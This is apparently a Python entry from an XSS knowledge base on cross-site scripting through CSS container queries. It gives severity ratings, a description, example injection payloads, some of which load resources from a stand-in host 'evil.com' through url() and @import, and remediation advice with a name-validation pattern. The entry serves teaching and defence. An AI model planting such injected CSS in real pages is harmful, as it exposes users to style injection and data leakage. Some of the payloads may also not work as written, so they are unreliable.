#!/usr/bin/env python3

"""
Project: BRS-KB (BRS XSS Knowledge Base)
Company: EasyProTech LLC (www.easypro.tech)
Dev: Brabus
Date: 2025-12-26 UTC
Status: Created
Telegram: https://t.me/EasyProTech

Knowledge Base: CSS Container Queries XSS
"""

DETAILS = {
    "title": "Cross-Site Scripting (XSS) via CSS Container Queries",
    "severity": "medium",
    "cvss_score": 6.2,
    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:L/A:N",
    "reliability": "high",
    "cwe": ["CWE-79"],
    "owasp": ["A03:2021"],
    "tags": ["xss", "css", "container-queries", "@container", "chrome-105"],
    "description": """
CSS Container Queries (@container) allow styling based on container size. XSS vulnerabilities
occur when user input controls container query conditions or container names without validation.

SEVERITY: MEDIUM
Can lead to CSS injection and style-based attacks. Container names can be used for CSS injection.
""",
    "attack_vector": """
CONTAINER QUERY NAME INJECTION:
@container ${userInput} (min-width: 300px) {
  body { background: url('//evil.com/xss'); }
}

CONTAINER QUERY CONDITION INJECTION:
@container sidebar (${userInput}) {
  .content { display: none; }
}

CONTAINER QUERY WITH EXPRESSION:
@container sidebar (min-width: 300px) {
  body {
    background: expression(alert(1));  // IE only
  }
}

CONTAINER QUERY WITH @IMPORT:
@container sidebar (min-width: 300px) {
  @import url('//evil.com/xss.css');
}

CONTAINER TYPE INJECTION:
container-type: ${userInput};  // XSS if type is controlled
""",
    "remediation": """
DEFENSE:

1. Validate container names (alphanumeric and hyphens only)
2. Validate container query conditions
3. Sanitize CSS content
4. Block @import in user-controlled CSS
5. Implement CSP style-src

SAFE PATTERN:
function validateContainerName(name) {
  if (!/^[a-z0-9-]+$/i.test(name)) {
    throw new Error('Invalid container name');
  }
  return name;
}
@container ${validateContainerName(userInput)} (min-width: 300px) { }

CSS SANITIZATION:
import { sanitize } from 'css-sanitize';
const safeCSS = sanitize(userInput);

OWASP REFERENCES:
- CWE-79: Cross-site Scripting
- CSS Container Queries Specification
""",
}
